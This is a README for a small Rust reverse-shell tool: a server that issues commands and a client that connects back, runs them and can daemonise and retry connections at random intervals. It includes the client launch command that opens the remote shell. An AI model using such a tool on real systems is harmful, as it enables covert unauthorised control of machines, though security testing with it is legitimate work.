# TRSH - tiny rust shell

trsh is a tiny backconnect shell written in rust. It should run under linux and MacOS. To get a static binary compile it with the rust musl target. 

trsh has the following components:

* trsh-server is the server component, sending commands to the backconnect client
* trsh-client is the client component, connecting back to the server and executing the commands sent by the server
* cryptolib is the crypto layer for the tiny rust shell. Currently there trsh can use Salsa20 or AES28. 

## trsh-server

The tiny rust shell server can be started with the following options:

``` shell
Server 1.0
asisdrico <asisdrico@outlook.com>
tiny rust shell server

USAGE:
    trsh-server [FLAGS] [OPTIONS] [COMMAND] [SUBCOMMAND]

FLAGS:
    -h, --help               Prints help information
    -r, --redirect_stderr    redirects stderr
    -V, --version            Prints version information

OPTIONS:
    -s, --server_addr <ADDRESS>    Sets the server address to listen to. [default: 127.0.0.1:4444]

ARGS:
    <COMMAND>    command to execute [default: w]

SUBCOMMANDS:
    get      
    help     Prints this message or the help of the given subcommand(s)
    put      
    shell    
```

## trsh-client

This is the backconnect client of the tiny rust shell. It can be started with the following options:

``` 
TRSH_NOLOOP=1 TRSH_DAEMON=1 ./trsh-client <backconnect ip:port>
```

* normal start mode is in foreground sleeping a random time in seconds as specified in the clients source SLEEP_MIN > SLEEPTIME < SLEEP_MAX between backconnect attempts.
* TRSH_NOLOOP=1 starts the client with no loop making exactly one backconnect attempt.
* TRSH_DAEMON=1 sends the client into background.

## License

Licensed under 

* MIT license (see LICENSE or http://opensource.org/licenses/MIT)

## Contribution

Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you shall be licensed as above, without any additional terms or conditions.
